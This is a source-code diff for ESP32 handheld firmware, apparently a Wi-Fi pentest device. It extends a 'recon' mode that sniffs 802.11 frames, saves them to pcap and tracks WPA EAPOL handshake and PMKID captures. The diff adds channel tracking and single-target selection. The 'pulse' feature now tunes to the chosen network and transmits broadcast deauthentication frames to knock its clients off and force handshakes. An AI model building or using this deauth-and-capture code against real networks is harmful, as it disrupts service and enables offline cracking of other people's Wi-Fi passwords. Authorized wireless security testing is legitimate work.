@@ -3,6 +3,7 @@ struct ReconTarget {
   uint8_t mask;
   bool pmkid;
   int8_t rssi;
+  uint8_t channel;
   uint32_t lastMs;
 };
 
@@ -20,6 +21,7 @@ struct ReconFrame {
   uint16_t len;
   uint16_t origLen;
   int8_t rssi;
+  uint8_t channel;
   uint32_t tsSec;
   uint32_t tsUsec;
 };
@@ -30,6 +32,7 @@ static volatile int rcFrameTail = 0;
 
 static ReconTarget rcTargets[kReconMaxTargets];
 static int rcTargetCount = 0;
+static int rcSelected = -1;
 static int rcMode = 0;
 static bool rcPulse = false;
 static bool rcActive = false;
@@ -37,6 +40,7 @@ static int rcHopIdx = 0;
 static uint32_t lastReconHopMs = 0;
 static uint32_t lastReconPulseMs = 0;
 static uint32_t lastReconDrawMs = 0;
+static uint32_t rcHintUntilMs = 0;
 
 static File reconPcapFile;
 static bool reconPcapOpen = false;
@@ -71,6 +75,7 @@ void reconCaptureCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
   rcFrameQ[rcFrameHead].len = (uint16_t)copyLen;
   rcFrameQ[rcFrameHead].origLen = (uint16_t)length;
   rcFrameQ[rcFrameHead].rssi = packet->rx_ctrl.rssi;
+  rcFrameQ[rcFrameHead].channel = packet->rx_ctrl.channel;
   const uint32_t nowUs = micros();
   rcFrameQ[rcFrameHead].tsSec = nowUs / 1000000UL;
   rcFrameQ[rcFrameHead].tsUsec = nowUs % 1000000UL;
@@ -156,6 +161,7 @@ static int rcFindOrAdd(const uint8_t* bssid) {
   rcTargets[idx].mask = 0;
   rcTargets[idx].pmkid = false;
   rcTargets[idx].rssi = -127;
+  rcTargets[idx].channel = 0;
   return idx;
 }
 
@@ -171,7 +177,7 @@ static void rcWriteFrameToPcap(const uint8_t* data, uint16_t len, uint16_t origL
   ++reconPcapFrames;
 }
 
-static void rcProcessFrame(const uint8_t* d, int length, int8_t rssi,
+static void rcProcessFrame(const uint8_t* d, int length, int8_t rssi, uint8_t channel,
                            uint16_t origLen, uint32_t tsSec, uint32_t tsUsec) {
   const uint8_t frameControl = d[0];
   int header = 24;
@@ -200,6 +206,7 @@ static void rcProcessFrame(const uint8_t* d, int length, int8_t rssi,
   const int idx = rcFindOrAdd(bssid);
   rcTargets[idx].mask |= (bits & 0x0F);
   rcTargets[idx].rssi = rssi;
+  if (channel >= 1 && channel <= 177) rcTargets[idx].channel = channel;
   rcTargets[idx].lastMs = millis();
 
   const int scanEnd = length < llcEnd + 220 ? length : llcEnd + 220;
@@ -223,23 +230,26 @@ static void rcDrain() {
     fr.len = rcFrameQ[t].len;
     fr.origLen = rcFrameQ[t].origLen;
     fr.rssi = rcFrameQ[t].rssi;
+    fr.channel = rcFrameQ[t].channel;
     fr.tsSec = rcFrameQ[t].tsSec;
     fr.tsUsec = rcFrameQ[t].tsUsec;
     for (int i = 0; i < fr.len; ++i) fr.data[i] = rcFrameQ[t].data[i];
     rcFrameTail = (t + 1) % kReconFrameSlots;
-    rcProcessFrame(fr.data, fr.len, fr.rssi, fr.origLen, fr.tsSec, fr.tsUsec);
+    rcProcessFrame(fr.data, fr.len, fr.rssi, fr.channel, fr.origLen, fr.tsSec, fr.tsUsec);
   }
 }
 
 static void rcSendPulse() {
+  if (rcSelected < 0 || rcSelected >= rcTargetCount) return;
+  const ReconTarget& t = rcTargets[rcSelected];
+  if ((t.mask & 0x0F) == 0x0F) return;
   static const uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
   uint8_t frame[26];
-  for (int i = 0; i < rcTargetCount; ++i) {
-    if ((rcTargets[i].mask & 0x0F) == 0x0F) continue;
-    buildDeauthFrame(frame, broadcast, rcTargets[i].bssid, 0xC0);
-    for (int k = 0; k < 2; ++k)
-      esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), false);
-  }
+  if (t.channel >= 1 && t.channel <= 177)
+    esp_wifi_set_channel(t.channel, WIFI_SECOND_CHAN_NONE);
+  buildDeauthFrame(frame, broadcast, t.bssid, 0xC0);
+  for (int k = 0; k < 2; ++k)
+    esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), false);
 }
 
 static const char* rcModeLabel(int m) {
@@ -249,9 +259,17 @@ static const char* rcModeLabel(int m) {
 void drawReconCapture() {
   currentView = View::kReconCapture;
   display.fillScreen(kBackground);
-  char sub[22];
-  snprintf(sub, sizeof(sub), "saved %lu", (unsigned long)reconPcapFrames);
-  drawHeader("RECON", rcActive ? sub : "idle");
+  char sub[24];
+  if (millis() < rcHintUntilMs) {
+    strncpy(sub, "pick target 1st", sizeof(sub));
+    sub[sizeof(sub) - 1] = 0;
+  } else if (rcActive) {
+    snprintf(sub, sizeof(sub), "saved %lu", (unsigned long)reconPcapFrames);
+  } else {
+    strncpy(sub, "idle", sizeof(sub));
+    sub[sizeof(sub) - 1] = 0;
+  }
+  drawHeader("RECON", sub);
 
   const int pillY = 46;
   const int pillW = 74;
@@ -269,15 +287,24 @@ void drawReconCapture() {
   const int shown = rcTargetCount < kReconVisibleRows ? rcTargetCount : kReconVisibleRows;
   for (int r = 0; r < shown; ++r) {
     const ReconTarget& t = rcTargets[r];
+    const bool sel = (r == rcSelected);
+    if (sel) display.drawRect(2, y - 3, kScreenWidth - 4, 36, kAccent);
     char ssid[18];
     rcResolveSsid(t.bssid, ssid, sizeof(ssid));
     display.setTextSize(1);
-    display.setTextColor(kForeground, kBackground);
-    display.setCursor(8, y);
+    display.setTextColor(sel ? kAccent : kForeground, kBackground);
+    display.setCursor(6, y);
+    display.print(sel ? ">" : " ");
+    display.setCursor(16, y);
     display.print(ssid);
-    if (rcPulse && (t.mask & 0x0F) != 0x0F) {
+    if (t.channel) {
+      display.setTextColor(kMuted, kBackground);
+      display.setCursor(118, y);
+      display.printf("ch%u", t.channel);
+    }
+    if (rcPulse && sel && (t.mask & 0x0F) != 0x0F) {
       display.setTextColor(kBad, kBackground);
-      display.setCursor(150, y);
+      display.setCursor(156, y);
       display.print("PULSE");
     }
     for (int m = 0; m < 4; ++m) {
@@ -303,7 +330,7 @@ void drawReconCapture() {
     display.print("Listening for EAPOL...");
   }
 
-  drawThreeButtonFooter("Mode", rcPulse ? "Pulse*" : "Pulse", "Back");
+  drawFourButtonFooter("Mode", "Pick", rcPulse ? "Pulse*" : "Pulse", "Back");
 }
 
 void reconCaptureCycleMode() {
@@ -311,8 +338,23 @@ void reconCaptureCycleMode() {
   rcHopIdx = 0;
 }
 
+void reconCapturePick() {
+  if (rcTargetCount == 0) {
+    rcSelected = -1;
+    rcHintUntilMs = millis() + 2500;
+    return;
+  }
+  rcSelected = rcSelected + 1;
+  if (rcSelected >= rcTargetCount) rcSelected = -1;
+}
+
 void reconCaptureTogglePulse() {
   if (!rcPulse) {
+    if (rcSelected < 0 || rcSelected >= rcTargetCount) {
+      rcHintUntilMs = millis() + 2500;
+      drawReconCapture();
+      return;
+    }
     if (!confirmActiveTest("Recon pulse")) {
       drawReconCapture();
       return;
@@ -324,6 +366,8 @@ void reconCaptureTogglePulse() {
 void startReconCapture() {
   if (!stopActiveTools()) return;
   rcTargetCount = 0;
+  rcSelected = -1;
+  rcHintUntilMs = 0;
   rcFrameHead = 0;
   rcFrameTail = 0;
   rcMode = 0;
@@ -389,10 +433,14 @@ void updateReconCapture() {
 }
 
 void reconCaptureTouch(int x) {
-  if (x < kScreenWidth / 3) {
+  const int zone = x / (kScreenWidth / 4);
+  if (zone <= 0) {
     reconCaptureCycleMode();
     drawReconCapture();
-  } else if (x < (kScreenWidth * 2) / 3) {
+  } else if (zone == 1) {
+    reconCapturePick();
+    drawReconCapture();
+  } else if (zone == 2) {
     reconCaptureTogglePulse();
     drawReconCapture();
   } else {
